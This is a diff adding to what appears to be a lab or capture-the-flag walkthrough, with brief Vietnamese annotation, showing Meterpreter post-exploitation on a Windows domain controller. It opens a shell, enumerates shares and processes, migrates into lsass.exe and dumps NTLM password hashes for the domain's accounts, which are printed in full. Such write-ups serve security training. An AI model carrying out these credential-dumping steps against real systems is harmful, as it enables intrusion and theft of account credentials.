@@ -115,3 +115,83 @@ Domain          : FLASH
 Logged On Users : 8
 Meterpreter     : x86/windows
 ```
+```
+meterpreter > shell
+Process 3440 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+```
+```
+C:\Windows\system32>net share
+net share
+
+Share name   Resource                        Remark
+
+-------------------------------------------------------------------------------
+C$           C:\                             Default share                     
+IPC$                                         Remote IPC                        
+ADMIN$       C:\Windows                      Remote Admin                      
+NETLOGON     C:\Windows\SYSVOL\sysvol\FLASH.local\SCRIPTS
+                                             Logon server share                
+speedster    C:\Shares\speedster             
+SYSVOL       C:\Windows\SYSVOL\sysvol        Logon server share                
+The command completed successfully.
+```
+
+```
+C:\Windows\system32>exit
+exit
+```
+
+```
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                 Arch  Session  User                          Path
+ ---   ----  ----                 ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System               x64   0
+ 68    4     Registry             x64   0
+ 396   4     smss.exe             x64   0
+ 480   744   svchost.exe          x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 492   708   dwm.exe              x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
+ 500   744   svchost.exe          x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 548   536   csrss.exe            x64   0
+ 616   536   wininit.exe          x64   0
+ 628   608   csrss.exe            x64   1
+ 708   608   winlogon.exe         x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
+ 744   616   services.exe         x64   0
+ 760   616   lsass.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
+ 780   964   conhost.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
+ 884   744   svchost.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 892   744   svchost.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 952   744   svchost.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 964   784   powershell.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\WindowsPowerShell
+                                                                               \v1.0\powershell.exe
+```
+Chon `760   616   lsass.exe`
+
+```
+meterpreter > migrate 760
+[*] Migrating from 1824 to 760...
+[*] Migration completed successfully.
+```
+
+```
+meterpreter > hahdump
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9ac3de200cb4d510fed7610c7037292:::
+ballen:1112:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
+jfox:1115:aad3b435b51404eeaad3b435b51404ee:c64540b95e2b2f36f0291c3a9fb8b840:::
+lnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9:::
+erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::
+ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:3ed6bd43dee8715e7f7b34043a856a0f:::
+```
+
+
